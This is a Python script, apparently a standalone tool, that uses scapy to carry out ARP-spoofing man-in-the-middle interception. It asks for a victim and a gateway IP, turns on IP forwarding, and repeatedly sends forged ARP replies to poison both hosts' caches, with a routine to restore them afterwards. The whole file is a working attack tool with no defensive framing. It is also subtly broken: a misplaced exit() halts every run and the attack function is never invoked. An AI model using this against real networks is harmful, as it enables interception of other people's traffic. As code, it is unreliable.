import sys
import os
import time

from scapy.config import conf
from scapy.layers.l2 import Ether, ARP
from scapy.sendrecv import srp, send 
import subprocess

# Check for root
if os.getuid() != 0:
    print("[*] Must run as root!")
exit()

try:
    interface = input("[*] Enter Desired Interface: ")
    victimIP = input("[*] Enter Victim IP: ")
    gateIP = input("[*] Enter Gateway IP: ")
except KeyboardInterrupt:
    print("\n[*] User Requested Shutdown")
    print("[*] Exiting...")
    sys.exit(1)

devnull = open("/dev/null", "w")


# Get MAC addres by IP address using ARP request
def get_mac(IP):
    conf.verb = 0
    ans, unans = srp(Ether(dst="ff:ff:ff:ff:ff:ff")/ARP(pdst=IP),
                     timeout=2, iface=interface, inter=0.1)
    for snd, rcv in ans:
        return rcv.sprintf(r"%Ether.src%")


# Turn on or off ip forwarding
def set_ip_forwarding(turn_on):
    if turn_on:
        message = "Enabling"
        value = 1
    else:
        message = "Disabling"
        value = 0
    print("\n[*] "+message+" IP Forwarding...\n")
    os.system("echo "+str(value)+" > /proc/sys/net/ipv4/ip_forward")


# ARP Spoof ourselves as AP
def trick(gm, vm):
    send(ARP(op=2, pdst=victimIP, psrc=gateIP, hwdst=vm))
    send(ARP(op=2, pdst=gateIP, psrc=victimIP, hwdst=gm))


# Undo ARP spoof
def reARP():
    print("\n[*] Restoring Targets...")
    victimMAC = get_mac(victimIP)
    gateMAC = get_mac(gateIP)
    send(ARP(op=2, pdst=gateIP, psrc=victimIP, hwdst="ff:ff:ff:ff:ff:ff",
             hwsrc=victimMAC), count=7)
    send(ARP(op=2, pdst=victimIP, psrc=gateIP, hwdst="ff:ff:ff:ff:ff:ff",
             hwsrc=gateMAC), count=7)


# Perform MITM
def mitm():
    try:
        victimMAC = get_mac(victimIP)
    except Exception as e:
        set_ip_forwarding(False)
        print("[!] Couldn't find victim MAC address")
        print("[!] Exiting...")
        sys.exit(1)

    try:
        gateMAC = get_mac(gateIP)
    except Exception as e:
        set_ip_forwarding(False)
        print("[!] Couldn't find gateway MAC address")
        print("[!] Exiting...")
        sys.exit(1)

    print("[*] MAC resolved successfully")

    while True:
        try:
            trick(gateMAC, victimMAC)
            time.sleep(1.5)
        except KeyboardInterrupt:
            finalize()
            break


# Cleanup
def finalize():
    reARP()
    set_ip_forwarding(False)
    print("[*] Shutting down...")
    sys.exit(1)


